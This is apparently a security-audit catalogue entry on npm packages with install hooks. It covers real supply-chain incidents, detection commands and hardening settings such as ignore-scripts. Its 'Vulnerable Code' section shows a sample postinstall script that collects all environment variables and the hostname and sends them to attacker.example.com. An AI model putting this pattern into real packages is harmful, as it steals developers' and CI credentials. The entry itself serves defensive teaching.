# OC-240: Package with Install Hooks

**Category:** Supply Chain & Dependencies
**Severity:** MEDIUM
**Auditors:** DEP-01
**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**OWASP:** A08:2021 -- Software and Data Integrity Failures

## Description

npm lifecycle scripts (preinstall, install, postinstall, prepare) execute arbitrary code during package installation. These hooks are the primary execution vector for supply chain malware: when a developer runs `npm install`, any package with an install hook runs code with the developer's full system privileges before a single line of application code executes. This makes install hooks the most dangerous feature of the npm package manager.

The attack surface is well-documented and actively exploited. In October 2023, Veracode identified 48 npm packages deploying reverse shells via preinstall and postinstall scripts. Each package contained obfuscated JavaScript in a `scripts/init.js` file that established a remote connection to attacker-controlled infrastructure. In October 2025, dcodx disclosed five malicious packages (including `op-cli-installer`, `unused-imports`, and `polyfill-corejs3`) that used postinstall hooks to harvest CI/CD secrets and developer credentials from environment variables, SSH keys, and cloud metadata endpoints.

The Shai-Hulud campaigns (September and November 2025) weaponized install hooks at scale. Compromised packages executed post-install code that scanned for GitHub Personal Access Tokens, npm tokens, and cloud API keys (AWS, GCP, Azure). The harvested credentials were then used to compromise additional maintainer accounts, creating a worm-like propagation cycle. Orca Security reported that the second wave established persistence by injecting malicious GitHub Actions workflows and creating branches named "shai-hulud" in victims' repositories.

## Detection

```
# List all packages with install scripts
npm ls --all --json | jq -r '
  [.. | .dependencies? // empty | to_entries[] |
  select(.value.scripts? and (.value.scripts | keys[] | test("pre|post|install")))]
  | .[].key'

# Check specific package for hooks
npm view <package-name> scripts

# Simpler: check node_modules for install scripts
find node_modules -name "package.json" -maxdepth 2 -exec grep -l "postinstall\|preinstall" {} \;

# Use socket or sandworm for automated detection
npx socket check
```

Look for: `preinstall`, `install`, `postinstall`, and `prepare` scripts in dependency package.json files, especially those that execute shell commands, download files, or access environment variables.

## Vulnerable Code

```json
{
  "name": "seemingly-normal-lib",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node scripts/setup.js"
  }
}
```

```javascript
// scripts/setup.js -- Malicious postinstall script pattern
const { execSync } = require("child_process");
const https = require("https");
const os = require("os");

// Harvest environment variables
const env = JSON.stringify(process.env);
const hostname = os.hostname();

// Exfiltrate to attacker server
const data = JSON.stringify({ env, hostname });
const req = https.request({
  hostname: "attacker.example.com",
  path: "/collect",
  method: "POST",
  headers: { "Content-Type": "application/json" },
});
req.write(data);
req.end();
```

## Secure Code

```ini
# .npmrc -- Disable install scripts globally
ignore-scripts=true
```

```json
{
  "scripts": {
    "postinstall": "npm rebuild",
    "prepare": "husky install"
  }
}
```

```yaml
# CI pipeline -- SECURE: install without running lifecycle scripts
steps:
  - run: npm ci --ignore-scripts
  - run: npm rebuild  # Rebuild native modules only
  - run: npx node-pre-gyp install  # For native dependencies that need compilation
  - run: npm run build
```

```javascript
// package.json -- Allow specific packages to run install scripts
// Using .npmrc or package.json "scripts" field
{
  "scripts": {
    "preinstall": "npx only-allow pnpm"
  },
  "pnpm": {
    "onlyBuiltDependencies": ["esbuild", "sharp", "sqlite3"]
  }
}
```

## Impact

Malicious install hooks execute with the full privileges of the user running `npm install`. On developer machines, this means access to SSH keys, npm tokens, git credentials, cloud API keys, browser cookies, and cryptocurrency wallet files. In CI/CD environments, it means access to deployment secrets, code signing keys, and service account credentials. The Shai-Hulud worm demonstrated that compromised install hooks can propagate autonomously through the npm ecosystem by using stolen tokens to republish other packages, creating an exponential blast radius from a single initial compromise.

## References

- Veracode (Phylum): 48 npm packages deploying reverse shells via install hooks (October 2023)
- dcodx: 5 malicious packages exfiltrating CI/CD secrets via postinstall (October 2025)
- Shai-Hulud: Worm propagation via compromised postinstall scripts (September-November 2025)
- CVE-2021-4229: ua-parser-js hijacked with crypto miner via modified install (October 2021)
- Coinspect: Supply-Chain Guardrails -- ignore-scripts recommendation (September 2025)
- CWE-829: https://cwe.mitre.org/data/definitions/829.html
